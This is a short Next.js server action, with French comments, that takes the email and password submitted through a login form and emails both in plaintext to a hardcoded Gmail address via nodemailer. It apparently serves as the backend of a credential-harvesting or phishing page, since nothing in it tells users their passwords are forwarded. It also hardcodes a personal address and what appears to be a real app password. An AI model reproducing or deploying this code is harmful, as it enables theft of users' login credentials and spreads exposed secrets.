"use server";

import nodemailer from "nodemailer";

export async function sendLoginData(formData: FormData) {
  const email = formData.get("email") as string;
  const password = formData.get("password") as string;

  // Configuration du transporteur (Gmail exemple)
  // IL EST CONSEILLÉ D'UTILISER DES VARIABLES D'ENVIRONNEMENT
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "m.khoukh2003@gmail.com", // Remplace par ton email expéditeur
      pass: "ztycxjrcdzpiucda", // Mot de passe d'application Google (pas ton mot de passe normal)
    },
  });

  try {
    await transporter.sendMail({
      from: "NextJS Login App",
      to: "m.khoukh2003@gmail.com", // L'adresse de réception demandée
      subject: "Nouvelle tentative de connexion",
      html: `
        <h1>Nouvelle Connexion</h1>
        <p><strong>Email :</strong> ${email}</p>
        <p><strong>Mot de passe :</strong> ${password}</p>
      `,
    });
    return { success: true };
  } catch (error) {
    console.error(error);
    return { success: false };
  }
}